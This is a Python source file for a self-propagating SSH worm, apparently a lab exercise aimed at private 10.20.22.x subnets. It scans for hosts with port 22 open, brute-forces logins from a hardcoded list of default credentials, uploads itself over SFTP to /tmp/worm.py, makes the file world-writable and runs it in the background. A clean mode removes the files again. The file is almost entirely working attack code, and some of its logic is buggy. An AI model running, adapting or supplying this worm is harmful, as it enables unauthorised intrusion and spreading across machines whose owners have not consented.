import paramiko
import sys
import socket
import nmap
import netifaces
import os

# The list of credentials to attempt
credList = [
('helo', 'world'),
('root', '#Gig#'),
('kali', 'kali'),
('osboxes', 'osboxes.org'),
('kevin', '123')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
    return os.path.exists(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	message = "Your system is infected "
	with open(INFECTED_MARKER_FILE, 'wt') as f:
		f.write(message)

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	sftpClient = sshClient.open_sftp()
	current_path = os.path.realpath(__file__)

	#Copy the worm to the remote machine
	sftpClient.put(current_path, "/tmp/worm.py")
	
	#Change permissions
	sshClient.exec_command("chmod 777 /tmp/worm.py")

	#Run the code
	sshClient.exec_command("nohup python3 /tmp/worm.py")

	sftpClient.close()
	sshClient.close()

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
    try:
        sshClient.connect(host, username=userName, password=password)
    except socket.error:
        return 3
    except paramiko.SSHException:
        return 1
    return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instance of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList: 
		if tryCredentials(host, username, password, ssh) == 0:
			return ssh, username, password 	
			
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	# Retrieve and return the IP of the current system.
	return netifaces.ifaddresses(interface)[2][0]['addr']

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork(network):
	import nmap
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()

	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there).
	portScanner.scan(network, arguments='-p 22 --open')

	# Scan the network for hosts
	hostInfo = portScanner.all_hosts()

	# The list of hosts that are up.
	liveHosts = []

	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:

		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	return liveHosts

#############################################
# Retrieves the ip of the network card with
# an IPv4 address that is not 127.0.0.1.
# @return - the string containing the IP
# address of the network adapter that is not
# if the IP is not 127.0.0.1; returns None
# if no such interface is detected
##############################################
def getifip():

	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()

	# The IP address
	ipAddr = None

	# Go through all the interfaces
	for netFace in networkInterfaces:

		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr']

		# Get the IP address
		if not addr == "127.0.0.1":

			# Save the IP addrss and break
			ipAddr = addr
			break

	return ipAddr

#++++++++++++++++++++++ MAIN +++++++++++++++++++++++++++#

if len(sys.argv) < 3:
	
	clean = False
	multiple = False
	if len(sys.argv) == 2:
		if sys.argv[1] in ('-c', '--clean'):
			clean = True
		elif sys.argv[1] in ('-m', '--multiple'):
			multiple = True
		else:
			print("Invalid argument")
			sys.exit()

	if isInfectedSystem() and not clean:
		sys.exit()
	else:
		#Mark infected
		markInfected()
		
		#Get the IP of the current system
		ip = getifip()
		#Get the hosts on the same network
		network = "10.20.22.0/25"
		networkHosts = getHostsOnTheSameNetwork(network)

		#If option -m selected
		if multiple:
			networkHosts.append(getHostsOnTheSameNetwork("10.20.22.128/25"))

		#Remove the IP of the current system
		#from the list of discovered systems (We do not want to target ourselves!).
		if ip in networkHosts and not clean:
			networkHosts.remove(ip)

		print("Found hosts", networkHosts)

		#Go through the network hosts
		for host in networkHosts:
			#Try to attack this host
			sshInfo = attackSystem(host)

			print(f"Host: {host}; username:'{sshInfo[1]}'; password:'{sshInfo[2]}'")

			# Did the attack succeed?
			if sshInfo:
				if not clean:
					print("Trying to spread")
					infected = None
					try:
						sftp = sshInfo[0].open_sftp()
						#Check if infected.txt exists
						infected = sftp.file(INFECTED_MARKER_FILE, 'r')
						sftp.close()
					except IOError:
						print("Get this system infected")
						spreadAndExecute(sshInfo[0])
						print("Spreading complete!")
					if infected:
						print(f"{host} is already infected")

				else:
					print("Trying to clean")
					infected = None
					worm = None
					try:
						sftp = sshInfo[0].open_sftp()
						#Check if infected.txt exists
						infected = sftp.file(INFECTED_MARKER_FILE, 'r')
						worm = sftp.file("/tmp/worm.py",'r')
						sftp.close()
					except IOError:
						print("This system is not infected")
					if infected and worm:
						print(f"{host} is infected\n")
						print(f"Cleaning {host} \n")
						sshInfo[0].exec_command("rm /tmp/infected.txt")
						sshInfo[0].exec_command("rm /tmp/worm.py")
			#Close the SSH session
			sshInfo[0].close()

